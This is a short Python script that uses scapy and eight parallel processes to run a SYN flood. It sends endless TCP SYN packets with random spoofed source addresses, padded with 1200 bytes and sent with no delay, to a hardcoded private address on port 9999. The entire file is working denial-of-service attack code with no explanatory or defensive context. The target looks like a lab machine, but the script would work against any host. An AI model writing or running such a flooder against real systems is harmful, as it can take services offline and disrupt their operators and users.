import multiprocessing
from scapy.all import *
import time
import sys


def synFlood(target_ip, target_port, interval):
    ip_conf = IP(src=RandIP(), dst=target_ip)
    packet = ip_conf / TCP(dport=target_port, flags="S") / Raw(b"X" * 1200)
    while True:
        send(packet, verbose=False)
        time.sleep(interval)


def start(target_ip, target_port, interval, processes):
    for _ in range(processes):
        process = multiprocessing.Process(target=synFlood, args=(target_ip, target_port, interval))
        process.start()


if __name__ == "__main__":
    target_ip = "192.168.33.48"
    target_port = 9999
    processes_num = 8

    try:
        print(f"Start SYN flood -> {target_ip}:{target_port} with {processes_num} processes")
        start(target_ip, target_port, 0, processes_num)
    except KeyboardInterrupt:
        sys.exit(0)
